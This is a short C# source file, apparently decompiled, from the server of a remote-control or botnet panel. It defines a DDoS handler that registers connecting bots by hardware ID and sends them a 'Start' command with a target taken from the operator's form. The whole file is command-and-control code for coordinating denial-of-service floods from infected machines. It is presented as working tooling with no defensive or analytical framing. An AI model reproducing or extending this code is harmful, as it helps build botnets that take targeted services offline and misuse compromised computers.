using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerDDos
{
	public static void Read(Clients clients, object[] array)
	{
		if (!((string)array[1] == "Connect"))
		{
			return;
		}
		if (Program.form.DDos.work)
		{
			clients.Hwid = (string)array[2];
			clients.eventDisconnect += delegate
			{
				Program.form.DDos.Invoke((MethodInvoker)delegate
				{
					Program.form.DDos.clients.Remove(clients);
				});
			};
			Program.form.DDos.Invoke((MethodInvoker)delegate
			{
				Program.form.DDos.clients.Add(clients);
			});
			if (Program.form.DDos.materialSwitch7.Checked)
			{
				clients.Send(new object[2]
				{
					"Start",
					Program.form.DDos.rjTextBox1.Texts
				});
			}
		}
		else
		{
			clients.Disconnect();
		}
	}
}
